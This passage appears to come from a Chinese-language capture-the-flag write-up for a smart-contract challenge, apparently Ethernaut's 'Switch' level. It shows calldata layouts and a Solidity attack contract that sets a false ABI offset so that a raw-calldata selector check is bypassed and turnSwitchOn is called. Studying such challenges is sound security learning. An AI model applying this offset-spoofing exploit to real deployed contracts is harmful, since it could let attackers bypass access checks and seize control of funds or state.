`onlyOff` 中使用底层的 calldata 判断其中的 selector。而此时的 selector 编码在参数中，calldata 的编码布局大致为

| 当前调用 selector                                      | bytes4(keccak256("flipSwitch(bytes)") |
| ------------------------------------------------------ | ------------------------------------- |
| 参数 bytes memory _data 的起始 offset                  | bytes32(0x20)                         |
| bytes memory _data 的长度                              | bytes32(0x4)                          |
| bytes memory _data 的内容，也就是下一次调用的 selector | bytes4(keccak256("turnSwitchOff()")   |

如果继续使用这种布局，下一次调用的 selector 确实会被限制，但这里对参数 bytes memory _data 的起始 offset 并没有严格限制，因此可以修改 offset 并将 `_data` 的内容 (也就是下一步的 selector) 放在其他位置，从而绕过检测。

这里使用的布局是

| 当前调用 selector                                      | bytes4(keccak256("flipSwitch(bytes)") |
| ------------------------------------------------------ | ------------------------------------- |
| 参数 bytes memory _data 的起始 offset                  | bytes32(0x60)                         |
| 填充                                                   | bytes32(0)                            |
| 用于绕过检测的填充                                     | keccak256("turnSwitchOff()")          |
| bytes memory _data 的长度                              | bytes32(0x4)                          |
| bytes memory _data 的内容，也就是下一次调用的 selector | bytes4(keccak256("turnSwitchOn()")    |

```solidity
pragma solidity ^0.8.0;

import "forge-std/console2.sol";

contract SwitchHack {
    constructor(address _switch) {
        bytes memory _calldata = abi.encodePacked(bytes4(keccak256("flipSwitch(bytes)")),
                                                  bytes32(uint256(0x60)),
                                                  bytes32(uint256(0x0)),
                                                  keccak256("turnSwitchOff()"),
                                                  bytes32(uint256(0x4)),
                                                  bytes4(keccak256("turnSwitchOn()")));
        address(_switch).call(_calldata);
    }
}
```

